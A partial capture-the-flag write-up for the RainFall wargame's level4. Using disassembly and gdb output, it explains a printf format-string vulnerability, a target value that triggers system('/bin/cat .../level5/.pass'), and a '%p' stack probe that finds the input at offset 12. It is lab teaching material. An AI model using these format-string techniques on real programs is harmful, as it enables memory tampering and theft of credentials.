# SAME AS LEVEL3, PRINTF FORMAT STRING VULNERABILITY

```
080484a7 <main>:
 80484a7:	55                   	push   ebp
 80484a8:	89 e5                	mov    ebp,esp
 80484aa:	83 e4 f0             	and    esp,0xfffffff0
 80484ad:	e8 a5 ff ff ff       	call   8048457 <n>
 80484b2:	c9                   	leave  
 80484b3:	c3                   	ret
```
The main function only calls the function n

```
08048457 <n>:
 8048457:	55                   	push   ebp
 8048458:	89 e5                	mov    ebp,esp
 804845a:	81 ec 18 02 00 00    	sub    esp,0x218
 8048460:	a1 04 98 04 08       	mov    eax,ds:0x8049804
 8048465:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 8048469:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
 8048470:	00 
 8048471:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 8048477:	89 04 24             	mov    DWORD PTR [esp],eax
 804847a:	e8 d1 fe ff ff       	call   8048350 <fgets@plt>
```
```
08048444 <p>:
 8048444:	55                   	push   ebp
 8048445:	89 e5                	mov    ebp,esp
 8048447:	83 ec 18             	sub    esp,0x18
 804844a:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
 804844d:	89 04 24             	mov    DWORD PTR [esp],eax
 8048450:	e8 eb fe ff ff       	call   8048340 <printf@plt>
 8048455:	c9                   	leave  
 8048456:	c3                   	ret    
```
Like in level3, its calling fgets on a buffer, no vulnerability here, but calls the function p with the buffer as the string format argument for printf.

```
 804848d:	a1 10 98 04 08       	mov    eax,ds:0x8049810
 8048492:	3d 44 55 02 01       	cmp    eax,0x1025544
 8048497:	75 0c                	jne    80484a5 <n+0x4e>
 8048499:	c7 04 24 90 85 04 08 	mov    DWORD PTR [esp],0x8048590
 80484a0:	e8 bb fe ff ff       	call   8048360 <system@plt>
 80484a5:	c9                   	leave  
```
Then the value at the address 0x8049810 is compared to the value 0x1025544, if they are equal, the string at 0x8048590 is passed to system.

```
(gdb) p (char*) 0x8048590
$4 = 0x8048590 "/bin/cat /home/user/level5/.pass"
```
The string at 0x8048590 is "/bin/cat /home/user/level5/.pass", so we need to make the value at 0x8049810 equal to 0x1025544 to get the flag.

```
level4@RainFall:~$ ./level4
aaaa %p %p %p %p %p %p %p %p %p %p %p %p
aaaa 0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil) 0xbffff748 0x804848d 0xbffff540 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161
```
Like in level3, we first need to find the offset where the format string is located in the stack by printing the stack. The offset is 12